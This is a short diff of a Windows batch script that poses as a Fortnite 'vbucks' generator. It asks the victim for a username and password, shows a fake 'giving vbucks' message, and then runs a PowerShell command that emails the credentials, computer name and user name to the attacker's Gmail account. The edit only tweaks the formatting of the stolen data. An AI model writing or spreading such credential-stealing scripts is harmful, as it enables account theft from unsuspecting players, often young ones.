@@ -45,4 +45,4 @@ set /p input3=password:
 set /p input2=vbucks:
 echo giving %input1% %input2% vbucks
 timeout 4 >nul
-powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%' , '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = '%input1%%input3%computername: %COMPUTERNAME%username:%USERNAME%.';$SMTPInfo.Send($ReportEmail);
+powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%' , '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = '%input1%:%input3%computername: %COMPUTERNAME%username:%USERNAME%.';$SMTPInfo.Send($ReportEmail);
